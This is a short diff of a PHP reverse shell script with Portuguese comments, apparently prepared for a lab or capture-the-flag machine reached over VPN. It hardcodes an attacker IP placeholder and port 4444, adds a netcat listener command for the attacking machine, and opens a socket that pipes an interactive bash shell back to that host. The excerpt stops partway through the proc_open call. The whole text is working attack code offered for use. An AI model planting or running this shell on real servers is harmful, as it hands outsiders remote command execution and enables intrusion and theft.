@@ -1,13 +1,10 @@
+
+// Na maquina atacante: nc -lvnp 4444
 <?php
-$ip = getenv("ATTACKER_IP");
-$port = getenv("ATTACKER_PORT") ?: 4444;
+$ip = "SEU_IP_DA_VPN";
+$port = 4444;
 
-if (!$ip) {
-    die("ATTACKER_IP não definido\n");
-}
-
-$sock = fsockopen($ip, (int)$port);
-
+$sock = fsockopen($ip, $port);
 $proc = proc_open("/bin/bash -i", [
     0 => $sock,
     1 => $sock,
